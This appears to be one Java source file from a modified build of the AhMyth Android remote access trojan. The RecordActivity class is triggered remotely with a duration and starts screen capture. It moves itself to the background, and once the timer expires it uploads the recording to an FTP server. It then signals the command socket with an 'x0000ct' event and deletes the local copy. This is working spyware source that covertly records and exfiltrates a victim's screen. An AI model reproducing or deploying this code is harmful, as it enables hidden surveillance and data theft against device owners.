package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.MediaCodecInfo;
import android.media.MediaCodecList;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.util.Log;
import android.widget.Toast;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import static ahmyth.mine.king.ahmyth.ScreenRecorder.AUDIO_AAC;
import static ahmyth.mine.king.ahmyth.ScreenRecorder.VIDEO_AVC;

/**
 * Created by Administrator on 2018/1/14.
 */

public class RecordActivity extends Activity {
    private static RecordActivity instance;
    private static final int REQUEST_MEDIA_PROJECTION = 1;
    private static final int REQUEST_PERMISSIONS = 2;
    // members below will be initialized in onCreate()
    private MediaProjectionManager mMediaProjectionManager;
    //private Button mButton;
    private MediaCodecInfo[] mAvcCodecInfos; // avc codecs
    private MediaCodecInfo[] mAacCodecInfos; // aac codecs
    private ScreenRecorder mRecorder;
    private static int seconds=0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        instance = this;
        mMediaProjectionManager = (MediaProjectionManager) getApplicationContext().getSystemService(MEDIA_PROJECTION_SERVICE);
        Intent intent = getIntent();
        seconds = intent.getIntExtra("extra_data",1);
        Log.d("Ahmyth","seconds"+seconds);
        //if (hasPermissions()) {
            startCaptureIntent();
        //} else if (Build.VERSION.SDK_INT >= M) {
         //   requestPermissions();
        //}

    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            // NOTE: Should pass this result data into a Service to run ScreenRecorder.
            // The following codes are merely exemplary.
            MediaProjection mediaProjection = mMediaProjectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                Log.e("@@", "media projection is null");
                return;
            }
            VideoEncodeConfig video = createVideoConfig();
            AudioEncodeConfig audio = createAudioConfig();
            if (video == null || audio == null) {
                mediaProjection.stop();
                return;
            }
            File dir = getSavingDir();
            if (!dir.exists() && !dir.mkdirs()) {
                cancelRecorder();
                return;
            }
            if(seconds!=0) {
                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd-HHmmss", Locale.US);
                String aa=dir+"/Screen-" + format.format(new Date()) + "-" + video.width + "x" + video.height + ".mp4";
                final File file = new File(dir, "Screen-" + format.format(new Date())
                        + "-" + video.width + "x" + video.height + ".mp4");
                Log.d("@@", "Create recorder with :" + video + " \n " + audio + "\n " + file);
                mRecorder = newRecorder(mediaProjection, video, audio, file);
            //if (hasPermissions()) {
            //if(seconds!=0) {
                startRecorder();
                Log.d("Ahmyth", "startRecorder" + seconds);
                TimerTask task = new TimerTask() {
                    @Override
                    public void run() {
                        /**
                         *要执行的操作
                         *
                         */
                        cancelRecorder();
                        Log.d("Ahmyth", "sendVoice   " + seconds);
                        //delay(5 * 1000);
                        //sendVoice(file);
                        Log.d("Ahmyth", "sendVoice   " + aa);
                        delay(2* 1000);
                        ftpUpload(aa);
                        //killRecordActivity();
                    }
                };
                Timer timer = new Timer();
                timer.schedule(task, seconds * 1000);
                //file.delete();
            }else{
                killRecordActivity();
            }
            //} else {
            //    cancelRecorder();
            //}
        }
    }
    private void ftpUpload(String file) {
        new Thread() {
            public void run() {
                try {
                    System.out.println("正在连接ftp服务器....");
                    FTPManager ftpManager = new FTPManager();
                    if (ftpManager.connect()) {
                        if (ftpManager.uploadFile(file, "")) {
                            ftpManager.closeFTP();
                        }
                    }
                    final File filea = new File(file);
                    JSONObject object = new JSONObject();
                    object.put("file",true);
                    object.put("name",filea.getName());
                    IOSocket.getInstance().getIoSocket().emit("x0000ct" , object);
                    Log.d("Ahmyth","file.getName()x0000rt "+filea.getName());
                    filea.delete();
                    killRecordActivity();
                } catch (Exception e) {
                    // TODO: handle exception
                    // System.out.println(e.getMessage());
                }
            }
        }.start();
    }
    private static void sendVoice(File file){
        int size = (int) file.length();
        Log.d("Ahmyth","size                    "+size);
        Log.d("Ahmyth","file.getName()               "+file.getName());
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));

            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name",file.getName());
            object.put("buffer" , data);
            IOSocket.getInstance().getIoSocket().emit("x0000ct" , object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    public static void delay(int ms){
        try {
            Thread.currentThread();
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    private ScreenRecorder newRecorder(MediaProjection mediaProjection, VideoEncodeConfig video,
                                       AudioEncodeConfig audio, File output) {
        ScreenRecorder r = new ScreenRecorder(video, audio,
                1, mediaProjection, output.getAbsolutePath());
        return r;
    }
    static MediaCodecInfo[] findEncodersByType(String mimeType) {
        MediaCodecList codecList = new MediaCodecList(MediaCodecList.ALL_CODECS);
        List<MediaCodecInfo> infos = new ArrayList<>();
        for (MediaCodecInfo info : codecList.getCodecInfos()) {
            if (!info.isEncoder()) {
                continue;
            }
            try {
                MediaCodecInfo.CodecCapabilities cap = info.getCapabilitiesForType(mimeType);
                if (cap == null) continue;
            } catch (IllegalArgumentException e) {
                // unsupported
                continue;
            }
            infos.add(info);
        }

        return infos.toArray(new MediaCodecInfo[infos.size()]);
    }
    private AudioEncodeConfig createAudioConfig() {
        mAacCodecInfos = findEncodersByType(AUDIO_AAC);
        String codec = mAacCodecInfos[0].getName();
        if (codec == null) {
            return null;
        }
        int bitrate = 80000;
        int samplerate = 44100;
        int channelCount = 1;
        int profile = 1;
        //Log.d("createAudioConfig","bitrate:"+bitrate +"\n samplerate:" + samplerate +"\n channelCount:"+channelCount +"\nprofile:"+profile + "\nCodec:"+ codec);

        return new AudioEncodeConfig(codec, AUDIO_AAC, bitrate, samplerate, channelCount, profile);
    }

    private VideoEncodeConfig createVideoConfig() {
        mAvcCodecInfos = findEncodersByType(VIDEO_AVC);

        //final String codec = getSelectedVideoCodec();
        final String codec = mAvcCodecInfos[0].getName();
        if (codec == null) {
            // no selected codec ??
            return null;
        }
        // video size
        int width = 360;
        int height = 480;
        int framerate = 15;
        int iframe = 1;
        int bitrate = 800000;
        MediaCodecInfo.CodecCapabilities caps = mAvcCodecInfos[0].getCapabilitiesForType(VIDEO_AVC);
        MediaCodecInfo.CodecProfileLevel[] levels = caps.profileLevels;
        MediaCodecInfo.CodecProfileLevel profileLevel = levels[0];
        //Log.d("createVideoConfig","width:"+width +"\n height:" + height +"\n framerate:"+framerate +"\n iframe:"+iframe +"bitrate:"+bitrate +"\nprofileLevel:"+Utils.avcProfileLevelToString(profileLevel) + "\nCodec:"+ codec);
        return new VideoEncodeConfig(width, height, bitrate,
                framerate, iframe, codec, VIDEO_AVC, profileLevel);
    }

    private static File getSavingDir() {
        return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
                "ScreenCaptures");
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQUEST_PERMISSIONS) {
            // we request 2 permissions
            if (grantResults.length == 2
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED
                    && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                startCaptureIntent();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        instance = null;
        stopRecorder();
    }

    private void startCaptureIntent() {
        Intent captureIntent = mMediaProjectionManager.createScreenCaptureIntent();
        startActivityForResult(captureIntent, REQUEST_MEDIA_PROJECTION);
    }

    /*
    private void onButtonClick(View v) {
        if (mRecorder != null) {
            stopRecorder();
        } else if (hasPermissions()) {
            startCaptureIntent();
        } else if (Build.VERSION.SDK_INT >= M) {
            requestPermissions();
        } else {
            Log.d("MainActivity","No permission to write sd card");
        }
    }
    */
    private void startRecorder() {
        if (mRecorder == null) return;
        mRecorder.start();
        //mButton.setText("Stop Recorder");
        registerReceiver(mStopActionReceiver, new IntentFilter(ACTION_STOP));
        moveTaskToBack(true);
    }

    private void stopRecorder() {
        //mNotifications.clear();
        if (mRecorder != null) {
            mRecorder.quit();
        }
        mRecorder = null;
        //mButton.setText("Restart recorder");
        try {
            unregisterReceiver(mStopActionReceiver);
        } catch (Exception e) {
            //ignored
        }
    }

    private void cancelRecorder() {
        if (mRecorder == null) return;
        //Toast.makeText(this, "Permission denied! Screen recorder is cancel", Toast.LENGTH_SHORT).show();
        stopRecorder();
    }
    static final String ACTION_STOP = "net.yrom.screenrecorder.action.STOP";

    private BroadcastReceiver mStopActionReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            File file = new File(mRecorder.getSavedPath());
            if (ACTION_STOP.equals(intent.getAction())) {
                stopRecorder();
            }
            Toast.makeText(context, "Recorder stopped!", Toast.LENGTH_SHORT).show();
            StrictMode.VmPolicy vmPolicy = StrictMode.getVmPolicy();
            try {
                // disable detecting FileUriExposure on public file
                StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().build());
            } finally {
                StrictMode.setVmPolicy(vmPolicy);
            }
        }

    };
    public static void startRecordActivity(int sec) {
        Intent intent = new Intent("recordactivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("extra_data", sec);
        Myapplication.getAppContext().startActivity(intent);
        Log.d("Ahmyth","Startrecordactivity");
    }
    public static void killRecordActivity() {
        if(instance != null)
            instance.finish();
        Log.d("Ahmyth","killpointActivity");
    }
}
